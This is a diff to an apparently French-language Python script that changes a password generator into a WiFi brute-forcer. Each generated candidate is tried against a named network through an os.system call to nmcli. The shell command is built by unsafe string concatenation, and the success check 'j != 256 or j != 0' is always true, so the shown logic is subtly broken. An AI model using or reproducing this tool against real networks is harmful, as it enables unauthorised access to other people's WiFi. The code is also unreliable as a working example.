@@ -122,7 +122,6 @@ if int(choixz) == 1 :
 	print('le mot de passe est : ' + mot )
 else :
 	l = input("Longueur : ")
-	find = input('mot de passe : ')
 	k = 0
 	d = []
 	while k < int(l) :
@@ -154,9 +153,21 @@ else :
 		else :
 			print(mot,end='\r')
 			p.append(mot)
-			if str(find) == str(mot) :
-				print('le mot de passe est ' + mot)
-				i = False
-			
+			try :
+				j = os.system('nmcli d wifi connect "' + nomwifi + '" password ' + mot + " ifname " + interface )
+				print(j)
+				if j != 256 or j != 0 :
+					i = False
+				else :	
+					print(mot, end="\r")
+			except :
+				print(mot, end="\r")
+			"""
+			A faire si vous voulez voire les mots de passe
+			file = open("LIST","w")
+			file.write(str(p))
+			file.close()		
+			"""	
+	print('le mot de passe est : ' + mot )
 			
 			
